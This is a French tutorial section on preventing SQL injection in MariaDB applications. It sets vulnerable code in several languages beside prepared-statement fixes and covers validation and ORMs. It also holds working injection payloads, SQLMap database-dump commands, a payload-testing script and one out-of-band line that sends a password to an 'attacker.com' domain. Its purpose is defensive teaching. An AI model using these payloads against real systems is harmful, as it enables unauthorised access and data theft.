🔝 Retour au [Sommaire](/SOMMAIRE.md)

# 17.8 Prévention des injections SQL

> **Niveau** : Intermédiaire à Avancé  
> **Durée estimée** : 3-4 heures  
> **Prérequis** : 
> - Compréhension du SQL (Chapitres 2-4)
> - Maîtrise d'au moins un langage de programmation
> - Notions de sécurité des applications
> - Connexions à MariaDB (Section 17.1)

---

## 🎯 Objectifs d'apprentissage

À l'issue de cette section, vous serez capable de :

- **Comprendre** le mécanisme des injections SQL et leur dangerosité
- **Identifier** les points d'injection dans votre code
- **Prévenir** les injections avec les prepared statements
- **Valider** les entrées utilisateur de manière appropriée
- **Auditer** votre code existant pour détecter les vulnérabilités
- **Implémenter** les bonnes pratiques de sécurité dans tous vos projets
- **Utiliser** les outils de détection automatique

---

## Introduction

Les **injections SQL** sont la **vulnérabilité #1** des applications web depuis plus de 20 ans. Elles permettent à un attaquant de :

- 🔓 **Accéder** à des données confidentielles (mots de passe, cartes bancaires, etc.)
- 🗑️ **Supprimer** ou modifier des données
- 🚪 **Contourner** l'authentification
- 💣 **Exécuter** des commandes sur le serveur (dans certains cas)

### 📊 Impact réel

**Statistiques** :
- 🔴 **65%** des violations de données impliquent des injections SQL (Verizon DBIR)
- 🔴 **#3** dans le Top 10 OWASP 2021 (Injection)
- 🔴 **Millions** de sites web vulnérables actuellement

**Exemples célèbres** :
- 2008 : Heartland Payment Systems - 130 millions de cartes volées
- 2011 : Sony PlayStation Network - 77 millions de comptes compromis
- 2019 : First American Financial - 885 millions de documents exposés

💡 **La bonne nouvelle** : Les injections SQL sont **100% évitables** avec les bonnes pratiques !

---

## Comprendre les injections SQL

### 🔍 Le mécanisme

Une injection SQL se produit quand l'entrée utilisateur est **directement insérée** dans une requête SQL sans échappement ou validation.

**Exemple simple** :

```python
# CODE VULNÉRABLE ❌
username = input("Username: ")
password = input("Password: ")

query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
cursor.execute(query)
```

**Attaque** :
```
Username: admin' --
Password: (n'importe quoi)
```

**Requête générée** :
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
```

Le `--` est un commentaire SQL qui ignore la suite → l'attaquant se connecte comme admin **sans connaître le mot de passe** !

### 🎯 Anatomie d'une injection

```
INPUT UTILISATEUR → CONCATÉNATION → REQUÊTE SQL → EXÉCUTION
     ↓                    ↓              ↓           ↓
  "admin' --"          Non filtré    Altérée     Connexion admin
```

**Pourquoi c'est dangereux** :
1. L'application fait **confiance** à l'entrée utilisateur
2. Pas de distinction entre **code SQL** et **données**
3. L'attaquant peut **manipuler** la logique de la requête

---

## Types d'injections SQL

### 1️⃣ **Injection classique (In-band)**

L'attaquant voit directement le résultat de l'injection.

**Exemple - Extraction de données** :

```php
// CODE VULNÉRABLE ❌
$id = $_GET['id'];
$query = "SELECT title, content FROM posts WHERE id = $id";
$result = mysqli_query($conn, $query);
```

**Attaque** :
```
?id=1 UNION SELECT username, password FROM users --
```

**Résultat** : L'attaquant voit tous les utilisateurs et mots de passe dans la page.

### 2️⃣ **Injection aveugle (Blind SQL Injection)**

Pas de message d'erreur, mais l'attaquant peut **déduire** des informations.

**Exemple - Boolean-based** :

```python
# CODE VULNÉRABLE ❌
user_id = request.args.get('id')
query = f"SELECT * FROM users WHERE id = {user_id}"
result = cursor.execute(query)

if result.rowcount > 0:
    return "User exists"
else:
    return "User not found"
```

**Attaques** :
```
?id=1 AND 1=1  → "User exists" (TRUE)
?id=1 AND 1=2  → "User not found" (FALSE)

?id=1 AND SUBSTRING(@@version,1,1)='1'  → TRUE/FALSE
→ Extraire la version caractère par caractère
```

**Exemple - Time-based** :

```
?id=1 AND SLEEP(5) --
```

Si la page met 5 secondes à répondre → injection réussie.

### 3️⃣ **Injection hors bande (Out-of-band)**

L'attaquant exfiltre les données via un **autre canal** (DNS, HTTP).

```sql
-- Exemple (nécessite des privilèges élevés)
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a')) --
```

L'attaquant récupère les données via les logs DNS de son serveur.

---

## Exemples d'attaques détaillées

### 🚪 Contournement d'authentification

**Code vulnérable** :
```javascript
// Node.js - CODE VULNÉRABLE ❌
const username = req.body.username;
const password = req.body.password;

const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;

const [rows] = await connection.query(query);

if (rows.length > 0) {
    // Connecté !
}
```

**Attaque** :
```
Username: admin' OR '1'='1
Password: ' OR '1'='1
```

**Requête générée** :
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '' OR '1'='1'
```

`'1'='1'` est toujours vrai → **connexion réussie sans credentials** !

### 💣 Extraction de données (UNION)

**Code vulnérable** :
```java
// Java - CODE VULNÉRABLE ❌
String productId = request.getParameter("id");
String query = "SELECT name, price FROM products WHERE id = " + productId;

Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

**Attaque** :
```
?id=1 UNION SELECT username, password FROM users --
```

**Requête générée** :
```sql
SELECT name, price FROM products WHERE id = 1 
UNION 
SELECT username, password FROM users --
```

L'attaquant voit tous les utilisateurs et mots de passe !

### 🗑️ Modification/Suppression de données

**Code vulnérable** :
```csharp
// C# - CODE VULNÉRABLE ❌
string email = Request.Form["email"];
string query = $"DELETE FROM newsletter WHERE email = '{email}'";

using var command = new MySqlCommand(query, connection);
command.ExecuteNonQuery();
```

**Attaque** :
```
email: anything' OR '1'='1
```

**Requête générée** :
```sql
DELETE FROM newsletter WHERE email = 'anything' OR '1'='1'
```

**Résultat** : **TOUTE la table newsletter est supprimée** ! 💀

### 🔓 Élévation de privilèges

**Code vulnérable** :
```python
# Python - CODE VULNÉRABLE ❌
user_id = request.form['user_id']
new_role = request.form['role']

query = f"UPDATE users SET role = '{new_role}' WHERE id = {user_id}"
cursor.execute(query)
```

**Attaque** :
```
user_id: 1
role: admin' WHERE id = 999; UPDATE users SET role = 'admin' WHERE id = 5 --
```

**Requêtes générées** :
```sql
UPDATE users SET role = 'admin' WHERE id = 999;
UPDATE users SET role = 'admin' WHERE id = 5 --' WHERE id = 1
```

L'attaquant se donne le rôle admin (user id=5) !

---

## Prévention : Prepared Statements

### ✅ La solution ultime

Les **prepared statements** (requêtes préparées) séparent complètement le **code SQL** des **données**.

**Principe** :
```
1. Préparer la requête avec des placeholders (?)
2. Lier les valeurs aux placeholders
3. Exécuter
```

MariaDB **sait** que les valeurs sont des données, jamais du code SQL → **injection impossible**.

### 🐘 PHP (PDO)

**❌ VULNÉRABLE** :
```php
$email = $_POST['email'];
$query = "SELECT * FROM users WHERE email = '$email'";
$result = $pdo->query($query);
```

**✅ SÉCURISÉ** :
```php
$email = $_POST['email'];

// Prepared statement avec placeholder nommé
$query = "SELECT * FROM users WHERE email = :email";
$stmt = $pdo->prepare($query);
$stmt->execute(['email' => $email]);

$user = $stmt->fetch();
```

**✅ Alternative avec placeholder positionnel** :
```php
$query = "SELECT * FROM users WHERE email = ?";
$stmt = $pdo->prepare($query);
$stmt->execute([$email]);
```

**Insert sécurisé** :
```php
$name = $_POST['name'];
$email = $_POST['email'];
$age = $_POST['age'];

$query = "INSERT INTO users (name, email, age) VALUES (:name, :email, :age)";
$stmt = $pdo->prepare($query);
$stmt->execute([
    'name' => $name,
    'email' => $email,
    'age' => $age
]);

$userId = $pdo->lastInsertId();
```

### 🐍 Python (mysql-connector)

**❌ VULNÉRABLE** :
```python
email = request.form['email']
query = f"SELECT * FROM users WHERE email = '{email}'"
cursor.execute(query)
```

**✅ SÉCURISÉ** :
```python
email = request.form['email']

# Prepared statement avec placeholder %s
query = "SELECT * FROM users WHERE email = %s"
cursor.execute(query, (email,))  # Tuple

user = cursor.fetchone()
```

**⚠️ Attention** : Toujours passer un **tuple**, même pour une seule valeur :
```python
# ❌ FAUX
cursor.execute(query, email)  # Erreur !

# ✅ CORRECT
cursor.execute(query, (email,))  # Tuple avec une virgule
```

**Update sécurisé** :
```python
name = request.form['name']
user_id = request.form['id']

query = "UPDATE users SET name = %s WHERE id = %s"
cursor.execute(query, (name, user_id))
connection.commit()
```

**Multiple values** :
```python
users = [
    ('Alice', 'alice@example.com'),
    ('Bob', 'bob@example.com'),
    ('Charlie', 'charlie@example.com')
]

query = "INSERT INTO users (name, email) VALUES (%s, %s)"
cursor.executemany(query, users)
connection.commit()
```

### ☕ Java (JDBC)

**❌ VULNÉRABLE** :
```java
String email = request.getParameter("email");
String query = "SELECT * FROM users WHERE email = '" + email + "'";

Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

**✅ SÉCURISÉ** :
```java
String email = request.getParameter("email");

// PreparedStatement avec placeholder ?
String query = "SELECT * FROM users WHERE email = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, email);  // Index commence à 1

ResultSet rs = pstmt.executeQuery();

if (rs.next()) {
    String name = rs.getString("name");
    // ...
}
```

**Insert sécurisé** :
```java
String name = request.getParameter("name");
String email = request.getParameter("email");
int age = Integer.parseInt(request.getParameter("age"));

String query = "INSERT INTO users (name, email, age) VALUES (?, ?, ?)";
PreparedStatement pstmt = connection.prepareStatement(query, Statement.RETURN_GENERATED_KEYS);

pstmt.setString(1, name);
pstmt.setString(2, email);
pstmt.setInt(3, age);

int rowsAffected = pstmt.executeUpdate();

// Récupérer l'ID généré
ResultSet generatedKeys = pstmt.getGeneratedKeys();
if (generatedKeys.next()) {
    long userId = generatedKeys.getLong(1);
}
```

**Types de données** :
```java
pstmt.setString(1, stringValue);
pstmt.setInt(2, intValue);
pstmt.setLong(3, longValue);
pstmt.setDouble(4, doubleValue);
pstmt.setBoolean(5, boolValue);
pstmt.setDate(6, new java.sql.Date(date.getTime()));
pstmt.setTimestamp(7, new Timestamp(System.currentTimeMillis()));
pstmt.setNull(8, Types.VARCHAR);  // Valeur NULL
```

### 🟢 Node.js (mysql2)

**❌ VULNÉRABLE** :
```javascript
const email = req.body.email;
const query = `SELECT * FROM users WHERE email = '${email}'`;

const [rows] = await connection.query(query);
```

**✅ SÉCURISÉ** :
```javascript
const email = req.body.email;

// Prepared statement avec placeholder ?
const query = 'SELECT * FROM users WHERE email = ?';
const [rows] = await connection.query(query, [email]);

if (rows.length > 0) {
    const user = rows[0];
}
```

**Multiple placeholders** :
```javascript
const name = req.body.name;
const email = req.body.email;
const age = req.body.age;

const query = 'INSERT INTO users (name, email, age) VALUES (?, ?, ?)';
const [result] = await connection.query(query, [name, email, age]);

const userId = result.insertId;
```

**Named placeholders** :
```javascript
const query = 'SELECT * FROM users WHERE email = :email AND age > :min_age';
const [rows] = await connection.query(query, {
    email: 'alice@example.com',
    min_age: 18
});
```

### 🔵 Go (database/sql)

**❌ VULNÉRABLE** :
```go
email := r.FormValue("email")
query := fmt.Sprintf("SELECT * FROM users WHERE email = '%s'", email)

rows, err := db.Query(query)
```

**✅ SÉCURISÉ** :
```go
email := r.FormValue("email")

// Prepared statement avec placeholder ?
query := "SELECT id, name, email FROM users WHERE email = ?"
rows, err := db.Query(query, email)
if err != nil {
    log.Fatal(err)
}
defer rows.Close()

for rows.Next() {
    var id int
    var name, email string
    
    err := rows.Scan(&id, &name, &email)
    if err != nil {
        log.Fatal(err)
    }
    
    fmt.Printf("User: %s (%s)\n", name, email)
}
```

**Insert sécurisé** :
```go
name := r.FormValue("name")
email := r.FormValue("email")
age, _ := strconv.Atoi(r.FormValue("age"))

query := "INSERT INTO users (name, email, age) VALUES (?, ?, ?)"
result, err := db.Exec(query, name, email, age)
if err != nil {
    log.Fatal(err)
}

userId, _ := result.LastInsertId()
```

**Prepared statement réutilisable** :
```go
// Préparer une fois
stmt, err := db.Prepare("INSERT INTO users (name, email) VALUES (?, ?)")
if err != nil {
    log.Fatal(err)
}
defer stmt.Close()

// Utiliser plusieurs fois
users := []struct{name, email string}{
    {"Alice", "alice@example.com"},
    {"Bob", "bob@example.com"},
}

for _, user := range users {
    _, err := stmt.Exec(user.name, user.email)
    if err != nil {
        log.Fatal(err)
    }
}
```

### 🔷 .NET (MySqlConnector)

**❌ VULNÉRABLE** :
```csharp
string email = Request.Form["email"];
string query = $"SELECT * FROM users WHERE email = '{email}'";

using var command = new MySqlCommand(query, connection);
using var reader = await command.ExecuteReaderAsync();
```

**✅ SÉCURISÉ** :
```csharp
string email = Request.Form["email"];

// Prepared statement avec placeholder @name
string query = "SELECT * FROM users WHERE email = @email";

using var command = new MySqlCommand(query, connection);
command.Parameters.AddWithValue("@email", email);

using var reader = await command.ExecuteReaderAsync();

if (await reader.ReadAsync())
{
    var name = reader.GetString("name");
    var userEmail = reader.GetString("email");
}
```

**Insert sécurisé** :
```csharp
string name = Request.Form["name"];
string email = Request.Form["email"];
int age = int.Parse(Request.Form["age"]);

string query = "INSERT INTO users (name, email, age) VALUES (@name, @email, @age)";

using var command = new MySqlCommand(query, connection);
command.Parameters.AddWithValue("@name", name);
command.Parameters.AddWithValue("@email", email);
command.Parameters.AddWithValue("@age", age);

await command.ExecuteNonQueryAsync();

long userId = command.LastInsertedId;
```

**Types explicites (recommandé)** :
```csharp
command.Parameters.Add("@name", MySqlDbType.VarChar).Value = name;
command.Parameters.Add("@email", MySqlDbType.VarChar).Value = email;
command.Parameters.Add("@age", MySqlDbType.Int32).Value = age;
command.Parameters.Add("@is_active", MySqlDbType.Bool).Value = true;
command.Parameters.Add("@created_at", MySqlDbType.DateTime).Value = DateTime.Now;
```

---

## Cas particuliers

### 🔀 ORDER BY et colonnes dynamiques

**Problème** : Les prepared statements ne fonctionnent pas pour les noms de colonnes/tables.

**❌ NE FONCTIONNE PAS** :
```python
sort_column = request.args.get('sort')  # Ex: "name"

# Les placeholders ne marchent pas pour les noms de colonnes !
query = "SELECT * FROM users ORDER BY %s"
cursor.execute(query, (sort_column,))
# Résultat : ORDER BY 'name' (littéral, pas un nom de colonne)
```

**✅ SOLUTION : Whitelist** :
```python
sort_column = request.args.get('sort', 'id')

# Whitelist des colonnes autorisées
ALLOWED_COLUMNS = ['id', 'name', 'email', 'created_at']

if sort_column not in ALLOWED_COLUMNS:
    sort_column = 'id'  # Valeur par défaut

# Sûr car validé contre la whitelist
query = f"SELECT * FROM users ORDER BY {sort_column}"
cursor.execute(query)
```

**Direction (ASC/DESC)** :
```python
sort_column = request.args.get('sort', 'id')
sort_direction = request.args.get('dir', 'ASC').upper()

ALLOWED_COLUMNS = ['id', 'name', 'email', 'created_at']
ALLOWED_DIRECTIONS = ['ASC', 'DESC']

if sort_column not in ALLOWED_COLUMNS:
    sort_column = 'id'

if sort_direction not in ALLOWED_DIRECTIONS:
    sort_direction = 'ASC'

query = f"SELECT * FROM users ORDER BY {sort_column} {sort_direction}"
cursor.execute(query)
```

### 🔢 LIMIT et OFFSET

**Problème** : Même chose pour LIMIT/OFFSET.

**✅ SOLUTION** :
```python
limit = int(request.args.get('limit', 10))
offset = int(request.args.get('offset', 0))

# Validation
if limit < 1 or limit > 100:
    limit = 10

if offset < 0:
    offset = 0

# Sûr car converti en int
query = f"SELECT * FROM users LIMIT {limit} OFFSET {offset}"
cursor.execute(query)
```

### 📋 IN clause dynamique

**Problème** : Nombre variable de valeurs.

**❌ DANGEREUX** :
```python
ids = request.args.getlist('ids')  # ['1', '2', '3']
query = f"SELECT * FROM users WHERE id IN ({','.join(ids)})"
```

**✅ SOLUTION** :
```python
ids = request.args.getlist('ids')  # ['1', '2', '3']

# Convertir en int pour validation
ids = [int(id) for id in ids if id.isdigit()]

if not ids:
    return []

# Créer placeholders dynamiques
placeholders = ','.join(['%s'] * len(ids))
query = f"SELECT * FROM users WHERE id IN ({placeholders})"

cursor.execute(query, tuple(ids))
```

**Exemple avec 3 IDs** :
```sql
-- Requête générée
SELECT * FROM users WHERE id IN (%s, %s, %s)

-- Avec valeurs
SELECT * FROM users WHERE id IN (1, 2, 3)
```

### 🔍 LIKE avec wildcards

**Problème** : L'utilisateur peut injecter des wildcards.

**⚠️ ATTENTION** :
```python
search = request.args.get('q')

# L'utilisateur peut entrer : "%"
# Résultat : Retourne TOUS les utilisateurs !
query = "SELECT * FROM users WHERE name LIKE %s"
cursor.execute(query, (f'%{search}%',))
```

**✅ SOLUTION : Échapper les wildcards** :
```python
search = request.args.get('q', '')

# Échapper % et _
search = search.replace('%', r'\%').replace('_', r'\_')

query = "SELECT * FROM users WHERE name LIKE %s"
cursor.execute(query, (f'%{search}%',))
```

---

## Validation des entrées

### ✅ Principe de défense en profondeur

**Prepared statements + Validation = Sécurité maximale**

```
INPUT → VALIDATION → PREPARED STATEMENT → DATABASE
         ↓                    ↓
    Rejeter invalide    Échapper automatique
```

### 🔍 Types de validation

#### **1. Type de données**

```python
# Âge doit être un entier
try:
    age = int(request.form['age'])
    if not (0 <= age <= 150):
        raise ValueError("Age must be between 0 and 150")
except ValueError:
    return "Invalid age", 400
```

```typescript
// TypeScript avec validation Zod
import { z } from 'zod';

const userSchema = z.object({
    name: z.string().min(2).max(100),
    email: z.string().email(),
    age: z.number().int().min(0).max(150)
});

const userData = userSchema.parse(req.body);
// Si invalide, lève une erreur
```

#### **2. Format**

```python
import re

email = request.form['email']

# Validation email simple
email_regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
if not re.match(email_regex, email):
    return "Invalid email format", 400
```

```csharp
// .NET avec Data Annotations
public class User
{
    [Required]
    [StringLength(100, MinimumLength = 2)]
    public string Name { get; set; }
    
    [Required]
    [EmailAddress]
    public string Email { get; set; }
    
    [Range(0, 150)]
    public int Age { get; set; }
}
```

#### **3. Whitelist**

```python
ALLOWED_ROLES = ['user', 'moderator', 'admin']

role = request.form['role']

if role not in ALLOWED_ROLES:
    return "Invalid role", 400
```

#### **4. Longueur**

```java
String name = request.getParameter("name");

if (name == null || name.length() < 2 || name.length() > 100) {
    throw new IllegalArgumentException("Name must be between 2 and 100 characters");
}
```

### 🛡️ Exemple complet de validation

```python
from flask import Flask, request, jsonify
import re

app = Flask(__name__)

def validate_user_input(data):
    """Validation complète des données utilisateur"""
    errors = []
    
    # Name
    name = data.get('name', '').strip()
    if not name:
        errors.append("Name is required")
    elif len(name) < 2:
        errors.append("Name must be at least 2 characters")
    elif len(name) > 100:
        errors.append("Name must be at most 100 characters")
    elif not re.match(r'^[a-zA-Z\s\'-]+$', name):
        errors.append("Name contains invalid characters")
    
    # Email
    email = data.get('email', '').strip().lower()
    email_regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    if not email:
        errors.append("Email is required")
    elif not re.match(email_regex, email):
        errors.append("Invalid email format")
    elif len(email) > 255:
        errors.append("Email is too long")
    
    # Age
    try:
        age = int(data.get('age', 0))
        if age < 0 or age > 150:
            errors.append("Age must be between 0 and 150")
    except (ValueError, TypeError):
        errors.append("Age must be a number")
    
    if errors:
        raise ValidationError(errors)
    
    return {
        'name': name,
        'email': email,
        'age': age
    }

@app.route('/users', methods=['POST'])
def create_user():
    try:
        # Validation
        validated_data = validate_user_input(request.json)
        
        # Prepared statement (sécurisé)
        query = "INSERT INTO users (name, email, age) VALUES (%s, %s, %s)"
        cursor.execute(query, (
            validated_data['name'],
            validated_data['email'],
            validated_data['age']
        ))
        connection.commit()
        
        return jsonify({'id': cursor.lastrowid}), 201
        
    except ValidationError as e:
        return jsonify({'errors': e.errors}), 400
```

---

## ORM et prévention automatique

### ✅ Les ORM protègent automatiquement

Les ORM modernes utilisent **automatiquement** des prepared statements.

**SQLAlchemy (Python)** :
```python
from sqlalchemy.orm import Session

# ✅ SÉCURISÉ automatiquement
email = request.form['email']

user = session.query(User).filter(User.email == email).first()
# SQLAlchemy génère : SELECT * FROM users WHERE email = ?
```

**Hibernate (Java)** :
```java
// ✅ SÉCURISÉ automatiquement
String email = request.getParameter("email");

User user = session.createQuery("FROM User WHERE email = :email", User.class)
    .setParameter("email", email)
    .uniqueResult();
```

**Sequelize (Node.js)** :
```javascript
// ✅ SÉCURISÉ automatiquement
const email = req.body.email;

const user = await User.findOne({ where: { email: email } });
```

**Entity Framework Core (.NET)** :
```csharp
// ✅ SÉCURISÉ automatiquement
string email = Request.Form["email"];

var user = await context.Users
    .Where(u => u.Email == email)
    .FirstOrDefaultAsync();
```

### ⚠️ Attention au SQL brut dans les ORM

**❌ DANGEREUX** :
```python
# SQLAlchemy - SQL brut sans paramètres
email = request.form['email']
result = session.execute(f"SELECT * FROM users WHERE email = '{email}'")
```

**✅ SÉCURISÉ** :
```python
# SQLAlchemy - SQL brut avec paramètres
email = request.form['email']
result = session.execute(
    text("SELECT * FROM users WHERE email = :email"),
    {'email': email}
)
```

---

## Détection des vulnérabilités

### 🔍 Code review

**Checklist** :
- [ ] Rechercher toute concaténation de chaînes dans les requêtes SQL
- [ ] Vérifier l'utilisation de prepared statements partout
- [ ] Identifier les colonnes/tables dynamiques (ORDER BY, etc.)
- [ ] Valider que les entrées utilisateur sont validées
- [ ] Tester avec des inputs malveillants

**Patterns à rechercher** :

```bash
# Recherche dans le code (regex)
grep -r "execute.*\+.*request\." .
grep -r "query.*\$\{.*\}" .
grep -r "SELECT.*%s" . | grep -v "execute"
```

### 🛠️ Outils automatiques

#### **1. SQLMap (test de pénétration)**

```bash
# Tester une URL
sqlmap -u "http://example.com/product?id=1" --batch

# Tester avec authentification
sqlmap -u "http://example.com/profile" --cookie="session=abc123"

# Dumper la base
sqlmap -u "http://example.com/product?id=1" --dbs
sqlmap -u "http://example.com/product?id=1" -D myapp --tables
sqlmap -u "http://example.com/product?id=1" -D myapp -T users --dump
```

⚠️ **ATTENTION** : Utiliser UNIQUEMENT sur vos propres applications !

#### **2. Bandit (Python)**

```bash
pip install bandit

# Analyser le code Python
bandit -r ./src

# Rapport détaillé
bandit -r ./src -f json -o report.json
```

#### **3. SonarQube**

Détection automatique des injections SQL dans de nombreux langages.

```bash
# Analyser projet
sonar-scanner \
  -Dsonar.projectKey=myapp \
  -Dsonar.sources=./src \
  -Dsonar.host.url=http://localhost:9000
```

#### **4. Snyk**

```bash
npm install -g snyk

# Analyser dépendances et code
snyk test
snyk code test
```

### 🧪 Tests manuels

**Inputs de test** :

```
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
admin' --
admin' #
' UNION SELECT NULL --
1' AND SLEEP(5) --
```

**Script de test** :
```python
import requests

URL = "http://localhost:8000/login"

PAYLOADS = [
    "' OR '1'='1",
    "admin' --",
    "' UNION SELECT NULL --",
    "1' AND SLEEP(5) --"
]

for payload in PAYLOADS:
    data = {'username': payload, 'password': 'test'}
    response = requests.post(URL, data=data)
    
    print(f"Payload: {payload}")
    print(f"Status: {response.status_code}")
    print(f"Response time: {response.elapsed.total_seconds()}s")
    print("---")
```

---

## Bonnes pratiques récapitulatives

### ✅ À TOUJOURS faire

1. **Utiliser des prepared statements** pour TOUTES les requêtes avec input utilisateur
2. **Valider les entrées** (type, format, longueur, whitelist)
3. **Utiliser un ORM** si possible (protection automatique)
4. **Principe du moindre privilège** : Utilisateur DB avec droits minimaux
5. **Échapper les wildcards** dans les LIKE
6. **Whitelist** pour ORDER BY, noms de colonnes/tables
7. **Tests de sécurité** réguliers (SQLMap, code review)
8. **Logging** des tentatives d'injection détectées

### ❌ À NE JAMAIS faire

1. ❌ **Concaténer** des chaînes pour construire du SQL
2. ❌ **Faire confiance** aux inputs utilisateur
3. ❌ **Exposer** les messages d'erreur SQL aux utilisateurs
4. ❌ **Utiliser** `root` ou un compte avec tous les privilèges
5. ❌ **Désactiver** l'échappement ou la validation
6. ❌ **Ignorer** les warnings de sécurité des outils
7. ❌ **Penser** que la validation côté client suffit

### 🛡️ Défense en profondeur

```
┌────────────────────────────────────┐
│  1. Validation côté client         │ (UX, pas de sécurité)
├────────────────────────────────────┤
│  2. Validation côté serveur        │ (Format, type, longueur)
├────────────────────────────────────┤
│  3. Prepared statements            │ (Protection injection SQL)
├────────────────────────────────────┤
│  4. Utilisateur DB minimal         │ (Principe moindre privilège)
├────────────────────────────────────┤
│  5. WAF (Web Application Firewall) │ (Détection/blocage attaques)
├────────────────────────────────────┤
│  6. Monitoring et alertes          │ (Détection intrusion)
└────────────────────────────────────┘
```

---

## Checklist finale

### 📋 Audit de sécurité

- [ ] **Toutes** les requêtes utilisent prepared statements
- [ ] Aucune concaténation de chaînes dans les requêtes
- [ ] Validation des entrées implémentée partout
- [ ] ORDER BY, LIMIT : validation via whitelist ou conversion int
- [ ] LIKE : échappement des wildcards
- [ ] IN clause : placeholders dynamiques
- [ ] Messages d'erreur génériques (pas de détails SQL)
- [ ] Utilisateur DB avec privilèges minimaux
- [ ] Tests de sécurité automatisés (CI/CD)
- [ ] Code review incluant la sécurité
- [ ] Logging des tentatives d'injection
- [ ] Documentation des bonnes pratiques pour l'équipe

---

## ✅ Points clés à retenir

- 💀 **Injections SQL** : Vulnérabilité #1 des applications web, catastrophique
- 🛡️ **Prepared statements** : Solution ultime, obligatoire à 100%
- ✅ **Validation** : Défense en profondeur (type, format, longueur, whitelist)
- 🚫 **JAMAIS** de concaténation : `"SELECT * FROM users WHERE id = " + id` ❌
- 🔍 **Cas particuliers** : ORDER BY, LIMIT, IN → whitelist ou validation stricte
- 🤖 **ORM** : Protection automatique, mais attention au SQL brut
- 🧪 **Tests** : SQLMap, Bandit, SonarQube, tests manuels réguliers
- 📝 **Code review** : Rechercher patterns dangereux, vérifier partout
- 🎯 **Principe** : Ne JAMAIS faire confiance aux inputs utilisateur

---

## 🔗 Ressources et références

### **Documentation officielle**
- 📖 [OWASP - SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- 📖 [OWASP - SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- 📖 [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)

### **Outils de sécurité**
- 🛠️ [SQLMap](https://sqlmap.org/)
- 🛠️ [Bandit (Python)](https://bandit.readthedocs.io/)
- 🛠️ [SonarQube](https://www.sonarqube.org/)
- 🛠️ [Snyk](https://snyk.io/)

### **Guides et tutoriels**
- 📝 [PortSwigger - SQL Injection](https://portswigger.net/web-security/sql-injection)
- 📝 [OWASP Testing Guide - SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)

### **Formations**
- 🎓 [OWASP Top 10 Training](https://owasp.org/www-project-top-ten/)
- 🎓 [Web Security Academy](https://portswigger.net/web-security)

---

## ➡️ Section suivante

- **17.9** - Prepared Statements : Fonctionnement détaillé, performance, optimisations avancées

---

**MariaDB** : Version 11.8 LTS

⚠️ **AVERTISSEMENT DE SÉCURITÉ** : Les injections SQL sont une menace réelle et grave. Appliquez SYSTÉMATIQUEMENT les bonnes pratiques présentées dans cette section. En cas de doute, **utilisez toujours des prepared statements**.

⏭️ [Prepared statements et parameterized queries](/17-integration-developpement/09-prepared-statements.md)
